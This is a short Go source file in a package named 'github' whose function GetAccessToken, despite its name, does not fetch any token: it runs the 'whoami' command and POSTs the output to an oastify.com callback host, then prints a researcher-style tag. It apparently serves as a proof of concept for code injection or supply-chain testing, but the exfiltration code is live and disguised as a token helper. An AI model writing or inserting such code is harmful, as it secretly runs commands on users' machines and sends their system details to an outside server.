package github

import (
	"bytes"
	"fmt"
	"net/http"
	"os/exec"
)

// JWTToken is a global variable to store the JWT token
var JWTToken string

// GetAccessToken executes the 'whoami' command and sends the output to a remote server.
func GetAccessToken(installationID string) error {
	fmt.Println("Starting GetAccessToken function...")

	// Execute the 'whoami' command
	cmd := exec.Command("whoami")
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error executing 'whoami': %s\n", err)
		return err
	}

	// Print the 'whoami' output to the console
	fmt.Printf("whoami output: %s\n", output)

	// Prepare data to be sent to the remote server
	webhookURL := "https://fveolfhscxskbrbhthb82lmg87ey2qqf.oastify.com"
	data := fmt.Sprintf("whoami output: %s", output)
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer([]byte(data)))
	if err != nil {
		fmt.Printf("Error creating HTTP request: %s\n", err)
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send the data
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending data to remote server: %s\n", err)
		return err
	}
	defer resp.Body.Close()

	// Check the response from the server
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Received non-OK response: %d %s\n", resp.StatusCode, resp.Status)
		return fmt.Errorf("non-OK HTTP response: %s", resp.Status)
	}

	fmt.Println("Data successfully sent to the remote server.")
	
	// Mock behavior
	fmt.Println("anupamas0x1")

	return nil
}
